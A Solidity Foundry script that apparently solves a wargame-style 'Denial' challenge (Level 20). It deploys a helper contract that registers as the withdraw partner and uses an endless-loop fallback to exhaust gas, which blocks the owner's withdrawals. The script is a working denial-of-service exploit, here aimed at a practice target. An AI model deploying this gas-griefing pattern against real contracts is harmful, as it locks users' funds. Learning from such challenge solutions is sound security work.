// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


import{Script,console} from "forge-std/Script.sol";
import{Denial} from "../src/Level20.sol";
contract Helper{
    constructor(Denial instance){
            instance.setWithdrawPartner(address(this));  //becoming withdraw partner
    }
    fallback() external payable {
        while(true){   //drains all the available gas in the calling contract
    
        }
    }
}

contract Level20Solution is Script{
    Denial instance=Denial(payable(0xAbDEc3E633f95AE3EFC4A631bF8E77B5150F3deE));
    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Helper helper=new Helper(instance);
        vm.stopBroadcast();
    }

}